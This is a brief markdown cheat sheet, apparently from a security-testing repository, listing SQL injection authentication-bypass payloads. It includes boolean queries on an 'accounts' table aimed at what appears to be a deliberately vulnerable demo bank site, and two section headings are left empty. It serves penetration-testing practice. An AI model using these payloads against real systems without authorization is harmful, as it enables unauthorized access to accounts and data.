# SQL Injection

A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application

## _Authentication Bypass_

```
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--

// Using for: https://demo.testfire.net/bank/main.jsp

admin' and (select count(*) from accounts)>=5--
admin' and (select count(*) from accounts)=5--

```

## _SQL Injection using SQLMap_
[SQL link](https://github.com/josdoaitran/PayloadForSecurityTesting/blob/master/SQLMap.md)

## _DBMS Identification_

## _Entry point detection_


# Thanks to and Reference:

- https://github.com/payloadbox/sql-injection-payload-list
- https://hbh.sh/forum/15/17543/help-on-pen-test-assignment-altoro-mutual-site

